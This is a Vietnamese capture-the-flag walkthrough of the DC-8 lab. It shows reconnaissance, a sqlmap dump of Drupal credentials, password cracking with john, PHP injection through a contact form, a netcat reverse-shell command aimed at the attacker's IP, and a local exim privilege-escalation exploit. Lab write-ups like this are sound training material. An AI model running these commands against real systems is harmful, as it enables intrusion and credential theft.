# Extra Labs 8: DC-8 on vulhub

## Description

DC-8 tiếp tục là một phòng Lab được thiết kế có chủ đích để bạn tích lũy thêm kinh nghiệm trong thế giới kiểm thử xâm nhập (penetration testing).

Thử thách lần này là một sự kết hợp thú vị: nó vừa là một bài Lab thực thụ, vừa là một bản "chứng minh khái niệm" (proof of concept) để xem liệu việc cài đặt và cấu hình xác thực hai yếu tố (2FA) trên Linux có thực sự ngăn chặn được việc máy chủ bị khai thác hay không. Ý tưởng này xuất phát từ một câu hỏi về 2FA trên Linux được đặt ra trên Twitter, cùng với sự gợi ý từ @theart42.
## Mục tiêu tối thượng của bạn là vượt qua lớp bảo mật 2FA, chiếm quyền root và đọc được chiếc flag duy nhất. Có lẽ bạn sẽ chẳng hề hay biết 2FA đã được cài đặt và cấu hình cho đến khi bạn cố gắng đăng nhập qua SSH, nhưng chắc chắn là nó đang ở đó và đang làm tốt nhiệm vụ của mình.

Kỹ năng Linux và sự thành thạo với các dòng lệnh là điều bắt buộc, cùng với đó là một chút kinh nghiệm sử dụng các công cụ pentest cơ bản.

Đối với những người mới bắt đầu, Google là một trợ thủ đắc lực, nhưng bạn luôn có thể tweet cho tôi tại @DCAU7 để được hỗ trợ mỗi khi bị "tắc đường". Tuy nhiên, hãy nhớ rằng: Tôi sẽ không bao giờ đưa ra đáp án trực tiếp, thay vào đó, tôi sẽ gợi ý cho bạn một hướng đi để bạn có thể tiếp tục tiến về phía trước.
## Các bước thực hiện

Sử dụng lệnh netdiscover để tìm địa chỉ IP của máy mục tiêu trong mạng nội bộ:

![image](images/DC-8_images/image_001.png)

Sử dụng nmap để quét các cổng đang mở. Kết quả quét sẽ cho thấy máy mục tiêu đang mở 2 cổng: 80 (HTTP) và 20 (SSH)

```bash
nmap -sC -sV -p- 10.130.10.142
```

![image](images/DC-8_images/image_002.png)

Truy cập thử vào trang web của máy dc-8:

![image](images/DC-8_images/image_003.png)

Thử trinh sát với droopescan

![image](images/DC-8_images/image_004.png)

Sau khi scan xong em thấy được link đăng nhập

Em bất ngờ phát hiện ở trang who we are, mặc dù có cùng tiêu đề nhưng lại có đến 2 link dẫn Who We Are

![image](images/DC-8_images/image_005.png)

![image](images/DC-8_images/image_006.png)

Thử dùng sqlmap để tìm tài khoản và mật khẩu

```bash
sqlmap -u "http://10.130.10.143/..." -D d7db -T users -C "name,mail,pass" --dump
```

![image](images/DC-8_images/image_007.png)

Vậy là chúng ta tìm được 3 user và hashed password

Em tiến hành thử brute force password, trước tiên em cần kiểm tra loại mã hóa của pass đã, em dùng hashid:

```bash
hashid
```

![image](images/DC-8_images/image_008.png)

Tạo file hash.txt chứa các password hash

![image](images/DC-8_images/image_009.png)

Dùng lệnh john --format=Drupal7 hash.txt /usr/share/wordlists/rockyou.txt

![image](images/DC-8_images/image_010.png)

Em thấy được mật khẩu turtle hợp lệ

Em thử đăng nhập với 2 user mà chúng ta vừa thấy

![image](images/DC-8_images/image_011.png)

Thành công đăng nhập với user john:turtle

![image](images/DC-8_images/image_012.png)

Em thấy một phần có thể tạo Contact Us có thể chỉnh sửa lại trang, đặc biệt có thể chuyển sang format php

![image](images/DC-8_images/image_013.png)

![image](images/DC-8_images/image_014.png)

Lưu lại rồi điền thông tin và ấn submit, chúng ta sẽ được kết quả như hình

![image](images/DC-8_images/image_015.png)

Vậy thì giờ tiêm mã độc vào thôi:

![image](images/DC-8_images/image_016.png)

Lưu lại, và thử truy cập địa chỉ

http://10.130.10.143/node/3/done?sid=YOUR_ID&token=YOUR_TOKEN&cmd=id

![image](images/DC-8_images/image_017.png)

Tiếp tục khai thác tiếp LFI, giờ em tạo reverse shell:

&cmd=nc+-e+/bin/bash+10.130.10.132+4444

![image](images/DC-8_images/image_018.png)

Trước đó mở port 4444 trên máy kali để lắng nghe, và kết quả bắt được

![image](images/DC-8_images/image_019.png)

Tìm tất cả thư mục mà user hiện tại có quyền thực thi

![image](images/DC-8_images/image_020.png)

Em thấy exim4, em thử điều tra sâu hơn về exim4

![image](images/DC-8_images/image_021.png)

Kết quả cho thấy exim là một đặc vụ chuyển phát thư, hiện tại exim4 đang chạy version 4.89, em sẽ tìm xem có lỗ hổng nào khai thác được ở phiên bản này không:

```bash
Searchsploit exim
```

![image](images/DC-8_images/image_022.png)

Em thấy 1 kết quả phù hợp với ý định của chúng ta

Em tiến hành tải về

```bash
searchsploit -m linux/local/46996.sh
```

![image](images/DC-8_images/image_023.png)

![image](images/DC-8_images/image_024.png)

Giờ tải file này về máy nạn nhân:

![image](images/DC-8_images/image_025.png)

![image](images/DC-8_images/image_026.png)

![image](images/DC-8_images/image_027.png)

![image](images/DC-8_images/image_028.png)

![image](images/DC-8_images/image_029.png)

Vậy là chúng ta đã có quyền root và đọc được file flag.txt